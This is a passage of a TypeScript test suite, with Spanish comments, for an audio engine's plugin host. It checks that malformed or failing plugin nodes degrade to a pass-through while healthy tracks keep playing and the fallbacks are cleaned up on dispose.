    expect(typeof (node!.inputNode as unknown as { connect?: unknown }).connect).toBe('function');
    expect(node!.outputNode).toBeDefined();
    // Fix(I3): el test ya no es vacuo — exige la forma del pass-through
    // (ganancia unidad explícita + update noop), que el pre-fix no cumplía.
    expect((node!.inputNode as unknown as { gain: { value: number } }).gain.value).toBe(1);
    expect(() => node!.updateParameter('cualquiera', 42)).not.toThrow();
  });

  it('createInstanceNode degrada a pass-through si outputNode no es cableable (M1)', () => {
    pluginHost.registerPluginDefinition({
      id: 'aud10_half',
      name: 'Medio Formado',
      category: 'utility',
      description: 'input válido pero output sin connect',
      parameters: [],
      createDSPNode: (ctx) => ({ inputNode: ctx.createGain(), outputNode: {} }),
    });
    const simpleCtx = { createGain: () => ({ connect(): void {}, disconnect(): void {}, gain: { value: 0 } }) };
    const node = pluginHost.createInstanceNode(simpleCtx as unknown as BaseAudioContext, {
      instanceId: 'i_half',
      pluginId: 'aud10_half',
      name: 'Medio Formado',
      enabled: true,
      parameters: {},
    });
    expect(node).not.toBeNull();
    expect(typeof (node!.inputNode as unknown as { connect?: unknown }).connect).toBe('function');
    expect(typeof (node!.outputNode as unknown as { connect?: unknown }).connect).toBe('function');
    expect((node!.inputNode as unknown as { gain: { value: number } }).gain.value).toBe(1);
  });

  it('play() no rechaza y las pistas sanas suenan con un insert roto', async () => {
    const { engine, mockCtx } = setupT10Engine();
    const badTrack = makeT10Track('bad', {
      plugins: [
        { instanceId: 'ibad', pluginId: 'aud10_shape', name: 'Forma Rota', enabled: true, parameters: {} },
        { instanceId: 'ibad2', pluginId: 'aud10_throw', name: 'Lanza Siempre', enabled: true, parameters: {} },
      ],
    });
    const goodTrack = makeT10Track('good');
    await expect(
      engine.play([badTrack, goodTrack], [makeT10Clip('good')], 0)
      // I2: play() informa la supervivencia (true = arrancó).
    ).resolves.toBe(true);
    // La pista sana programó su clip; la rota quedó puenteada.
    expect(mockCtx.sources.length).toBe(1);
    expect(engine.getTrackNodes().get('good')).toBeDefined();
    expect(engine.getTrackNodes().get('bad')).toBeDefined();
  });

  it('un fallo al cablear degrada a pass-through sin propagar', async () => {
    pluginHost.registerPluginDefinition({
      id: 'aud10_wire',
      name: 'Cable Roto',
      category: 'utility',
      description: 'nodo ajeno que rompe connect',
      parameters: [],
      createDSPNode: (ctx) => {
        const g = ctx.createGain();
        const foreign = { connect: () => {}, __boomPlug: true };
        return { inputNode: foreign, outputNode: g, updateParameter: () => {} };
      },
    });
    const { engine, mockCtx } = setupT10Engine();
    const badTrack = makeT10Track('wbad', {
      plugins: [
        { instanceId: 'iwire', pluginId: 'aud10_wire', name: 'Cable Roto', enabled: true, parameters: {} },
      ],
    });
    const goodTrack = makeT10Track('wgood');
    await expect(
      engine.play([badTrack, goodTrack], [makeT10Clip('wgood')], 0)
      // I2: play() informa la supervivencia (true = arrancó).
    ).resolves.toBe(true);
    expect(mockCtx.sources.length).toBe(1);
  });

  it('el pass-through de un cableado roto queda registrado y se limpia en dispose (I2)', () => {
    pluginHost.registerPluginDefinition({
      id: 'aud10_wire2',
      name: 'Cable Roto 2',
      category: 'utility',
      description: 'nodo ajeno que rompe connect',
      parameters: [],
      createDSPNode: (ctx) => {
        const g = ctx.createGain();
        const foreign = { connect: () => {}, __boomPlug: true };
        return { inputNode: foreign, outputNode: g, updateParameter: () => {} };
      },
    });
    const mockCtx = new T10BaseContext();
    const track = makeT10Track('regtest', {
      plugins: [
        { instanceId: 'iwire2', pluginId: 'aud10_wire2', name: 'Cable Roto 2', enabled: true, parameters: {} },
      ],
    });
    const node = new TrackNode(mockCtx as unknown as BaseAudioContext, track);
    const dsps = (node as unknown as { activeDSPNodes: ActiveDSPNode[] }).activeDSPNodes;
    const fallback = dsps.find((d) => d.instanceId.startsWith('passthrough:'));
    expect(fallback).toBeDefined();
    node.dispose();
    expect(
      (fallback!.outputNode as unknown as { disconnected?: boolean }).disconnected
    ).toBe(true);
  });

  it('el cableado roto avisa con el pluginId antes de degradar (I2)', () => {
    pluginHost.registerPluginDefinition({
      id: 'aud10_wire3',
      name: 'Cable Roto 3',
      category: 'utility',
      description: 'nodo ajeno que rompe connect',
      parameters: [],
      createDSPNode: (ctx) => {
        const g = ctx.createGain();
        const foreign = { connect: () => {}, __boomPlug: true };
        return { inputNode: foreign, outputNode: g, updateParameter: () => {} };
      },
    });
    const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
    try {
      const mockCtx = new T10BaseContext();
      const track = makeT10Track('warntest', {
        plugins: [
          { instanceId: 'iwire3', pluginId: 'aud10_wire3', name: 'Cable Roto 3', enabled: true, parameters: {} },
        ],
      });
      new TrackNode(mockCtx as unknown as BaseAudioContext, track);
      expect(
        warnSpy.mock.calls.some((c) => String(c[0]).includes('aud10_wire3'))
      ).toBe(true);
    } finally {
      warnSpy.mockRestore();
    }
  });

  it('si falla la salida final, los plugins sanos se conservan (M3)', () => {
    pluginHost.registerPluginDefinition({
      id: 'aud10_good2',
      name: 'Sano',
      category: 'utility',
      description: 'pass-through sano',
      parameters: [],
      createDSPNode: (ctx) => {
        const g = ctx.createGain();
        return { inputNode: g, outputNode: g, updateParameter: () => {} };
      },
    });
    interface M3BreakerOut {
      calls: unknown[];
      connect: (dest?: { __isPanner?: boolean }) => void;
      disconnect: () => void;
    }
    pluginHost.registerPluginDefinition({
      id: 'aud10_panner_break',
      name: 'Rompe Panner',
      category: 'utility',
      description: 'salida que rompe solo hacia el panner',
      parameters: [],
      createDSPNode: (ctx) => {
        const g = ctx.createGain();
        const out: M3BreakerOut = {
          calls: [],
          connect: (dest) => {
            if (dest && dest.__isPanner) throw new Error('panner roto');
            out.calls.push(dest);
          },
          disconnect: () => {},
        };
        return { inputNode: g, outputNode: out, updateParameter: () => {} };
      },
    });
    const mockCtx = new T10BaseContext();
    const track = makeT10Track('m3test', {
      plugins: [
        { instanceId: 'igood2', pluginId: 'aud10_good2', name: 'Sano', enabled: true, parameters: {} },
        { instanceId: 'ibreak', pluginId: 'aud10_panner_break', name: 'Rompe Panner', enabled: true, parameters: {} },
      ],
    });
    const node = new TrackNode(mockCtx as unknown as BaseAudioContext, track);
    const dsps = (node as unknown as { activeDSPNodes: ActiveDSPNode[] }).activeDSPNodes;
    const fallback = dsps.find((d) => d.instanceId === 'passthrough:output');
    expect(fallback).toBeDefined();
    const passNode = fallback!.inputNode as unknown as T10AudioNode;
    const breakerOut = dsps.find((d) => d.instanceId === 'ibreak')!.outputNode as unknown as {
      calls: unknown[];
    };
    // La cadena sana alimenta el puente (no se descarta hacia la entrada).
    expect(breakerOut.calls).toContain(passNode);
    expect(
      (node.inputNode as unknown as T10AudioNode).connectedTo
    ).not.toContain(passNode);
    expect(passNode.connectedTo).toContain(node.pannerNode as unknown as T10AudioNode);
  });
});
